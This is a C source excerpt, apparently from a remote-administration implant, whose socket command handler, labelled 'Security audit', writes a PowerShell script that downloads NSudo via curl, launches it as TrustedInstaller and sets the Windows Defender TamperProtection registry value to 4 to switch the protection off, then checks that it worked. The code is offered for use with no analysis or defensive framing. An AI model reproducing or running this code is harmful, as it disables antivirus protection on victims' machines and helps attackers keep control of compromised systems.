...
static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
    ...
    /* Security audit */
        ...
        snprintf(zipPath, sizeof(zipPath), "%s\\NSudo.zip", tempPath);
        ...
        if (f) {
            ...
            fprintf(f, "Write-Host '[STEP 3] Downloading zip with curl.exe...'\n");
            fprintf(f, "curl.exe -L -o $zip 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip'\n");
            fprintf(f, "if (Test-Path $zip) {\n");
            fprintf(f, "    $size = (Get-Item $zip).Length\n");
            fprintf(f, "    Write-Host \"[STEP 4] Download complete. Size: $size bytes\"\n");
            fprintf(f, "    Write-Host '[STEP 5] Extracting with Expand-Archive...'\n");
            fprintf(f, "    try {\n");
            fprintf(f, "        Expand-Archive -Path $zip -DestinationPath $out -Force\n");
            fprintf(f, "        Write-Host '[STEP 6] Extraction complete.'\n");
            fprintf(f, "    } catch {\n");
            fprintf(f, "        Write-Host \"[STEP 6 ERROR] Expand-Archive failed: $_\"\n");
            fprintf(f, "        Write-Host '[STEP 6 FALLBACK] Trying .NET ZipFile extraction...'\n");
            fprintf(f, "        Add-Type -AssemblyName System.IO.Compression.FileSystem\n");
            fprintf(f, "        [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, $out)\n");
            fprintf(f, "    }\n");
            fprintf(f, "    Write-Host '[STEP 7] Checking for NSudoLC.exe...'\n");
            fprintf(f, "    $exe = Join-Path $out 'NSudo Launcher\\x64\\NSudoLC.exe'\n");
            fprintf(f, "    Write-Host \"  Looking for: $exe\"\n");
            fprintf(f, "    if (Test-Path $exe) {\n");
            fprintf(f, "        Write-Host '[STEP 8] NSudoLC.exe FOUND.'\n");
            fprintf(f, "        Write-Host '[STEP 9] Checking current TamperProtection value...'\n");
            ...
            fprintf(f, "        Write-Host '[STEP 10] Running registry command as TrustedInstaller...'\n");
            fprintf(f, "        $psi = New-Object System.Diagnostics.ProcessStartInfo\n");
            fprintf(f, "        $psi.FileName = $exe\n");
            fprintf(f, "        $psi.Arguments = '-U:T -P:E cmd.exe /c \"reg add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features /v TamperProtection /t REG_DWORD /d 4 /f\"'\n");
            fprintf(f, "        $psi.UseShellExecute = $false\n");
            fprintf(f, "        $psi.RedirectStandardOutput = $true\n");
            fprintf(f, "        $psi.RedirectStandardError = $true\n");
            fprintf(f, "        $psi.CreateNoWindow = $true\n");
            fprintf(f, "        $proc = [System.Diagnostics.Process]::Start($psi)\n");
            fprintf(f, "        $stdout = $proc.StandardOutput.ReadToEnd()\n");
            fprintf(f, "        $stderr = $proc.StandardError.ReadToEnd()\n");
            fprintf(f, "        $proc.WaitForExit()\n");
            fprintf(f, "        Write-Host \"  NSudo exit code: $($proc.ExitCode)\"\n");
            fprintf(f, "        if ($stdout) { Write-Host \"  STDOUT: $stdout\" }\n");
            fprintf(f, "        if ($stderr) { Write-Host \"  STDERR: $stderr\" }\n");
            fprintf(f, "        Write-Host '[STEP 11] Registry command completed. Verifying...'\n");
            ...
            fprintf(f, "        if ($after.TamperProtection -eq 4) {\n");
            fprintf(f, "            Write-Host '[SUCCESS] Tamper Protection disabled (value=4)'\n");
            fprintf(f, "        } else {\n");
            fprintf(f, "            Write-Host \"[FAIL] TamperProtection value is still $($after.TamperProtection)\"\n");
            fprintf(f, "        }\n");
            fprintf(f, "    } else {\n");
            fprintf(f, "        Write-Host '[ERROR] NSudoLC.exe NOT found after extraction'\n");
            ...
            fprintf(f, "    }\n");
            fprintf(f, "} else {\n");
            fprintf(f, "    Write-Host '[ERROR] Zip file not found after download'\n");
            fprintf(f, "}\n");
            fclose(f);
